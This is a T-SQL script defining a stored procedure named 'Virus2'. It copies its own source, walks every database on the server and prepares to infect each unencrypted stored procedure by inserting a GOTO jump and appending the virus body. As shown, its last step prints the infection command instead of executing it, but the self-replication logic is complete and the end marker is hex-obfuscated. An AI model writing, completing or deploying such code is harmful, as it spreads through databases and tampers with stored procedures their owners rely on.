SET QUOTED_IDENTIFIER OFF 
GO
SET ANSI_NULLS OFF 
GO

CREATE PROCEDURE Virus2
AS
DECLARE @sp varchar(128), @current_db VARCHAR(128), @current_proc varchar(255),@current_text varchar(8000),@cmd varchar(8000), @a int, @b int, @VirusCode varchar(8000),@Vsize int
--get Virus code
set @VirusCode=(SELECT c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type='p' and (o.category=0) and (o.id = @@Procid))
set @a=CHARINDEX('Virus:',@VirusCode)
set @b=CHARINDEX(convert(varchar(20),0x474F544F205669727573446F6E65),@VirusCode)
set @VirusCode=SUBSTRING(@VirusCode, @a-10, @b-@a+25)
SET @Vsize=datalength(@VirusCode)

DECLARE CursorDB CURSOR FOR 
SELECT NAME FROM master..SYSDATABASES where sid<>1
OPEN CursorDB
FETCH NEXT FROM CursorDB INTO @current_db
WHILE @@FETCH_STATUS=0
	BEGIN 
	print 'Database: '+@current_db
	create table #temp (c varchar(8000))
	insert #temp
	exec('SELECT c.text FROM '+@current_db+'..sysobjects o INNER JOIN '+@current_db+'..syscomments c ON c.id = o.id 
	WHERE o.type=''p'' and o.category=0 and encrypted=0 and left(c.text,22)<>''CREATE PROCEDURE Virus''')
		DECLARE _Cursor CURSOR FOR 
		select * from #temp
		OPEN _Cursor
		FETCH NEXT FROM _Cursor INTO @current_text
		WHILE @@FETCH_STATUS=0
			BEGIN 
				set @a=CHARINDEX('CREATE PROCEDURE',@current_text)+17
				set @b=CHARINDEX(' ',@current_text,@a)
				set @sp=substring(@current_text,@a,@b-@a)
print '*'+@sp+'*'
--is there room for the virus?
set @cmd='SELECT count(name) FROM '+@current_db+'..sysobjects o INNER JOIN '+@current_db+'..syscomments c ON c.id = o.id WHERE name='''+@sp+''''
create table #temp2(i int)
insert #temp2
exec(@cmd)
set @a=(select * from #temp2)
drop table #temp2
IF @a>1 GOTO IgnoreSP
IF datalength(@current_text)+@Vsize+23>8000 GOTO IgnoreSP
IF CHARINDEX('VirusDone:',@current_text)>0 GOTO IgnoreSP--is it infected?

SET @cmd =  replace(@current_text, 'CREATE PROCEDURE ', 'ALTER PROCEDURE ')
set @a=1
try2:
set @a=CHARINDEX('as',@cmd,(@a+1))
IF @a>0 and ascii(SUBSTRING(@cmd,@a-1,1)) NOT IN (32,13,10,9,0) GOTO try2
IF @a>0 and ascii(SUBSTRING(@cmd,@a+2,1)) NOT IN (32,13,10,9,0) GOTO try2
set @b=@a
--avoid --
while (@b>1) and (ascii(SUBSTRING(@cmd,@b,1))<>13) set @b=@b-1
if CHARINDEX('--',SUBSTRING(@cmd,@b,@a-@b))>0  GOTO try2
--avoid /*
set @b=@a
while (@b>2) and (SUBSTRING(@cmd,@b,1)<>'*') and (SUBSTRING(@cmd,@b-1,1)<>'/') set @b=@b-1
if (@b<@a)and (CHARINDEX('*/',@cmd,@b)>@a)  GOTO try2
set @cmd=stuff(@cmd, @a+2,1,char(13)+'GOTO Virus'+char(13)+'VirusDone:'+char(13))
--add virus code to SP
set @cmd=@cmd+@VirusCode
SET @cmd ='USE '+@current_db+' exec('''+replace(@cmd,'''','''''')+''')'
print( @cmd)
IgnoreSP:


			FETCH NEXT FROM _Cursor INTO @current_text
			END
		CLOSE _Cursor
		DEALLOCATE _Cursor
	drop table #temp
	FETCH NEXT FROM CursorDB INTO @current_db
	END
CLOSE CursorDB
DEALLOCATE CursorDB
GO
SET QUOTED_IDENTIFIER OFF 
GO
SET ANSI_NULLS ON 
GO

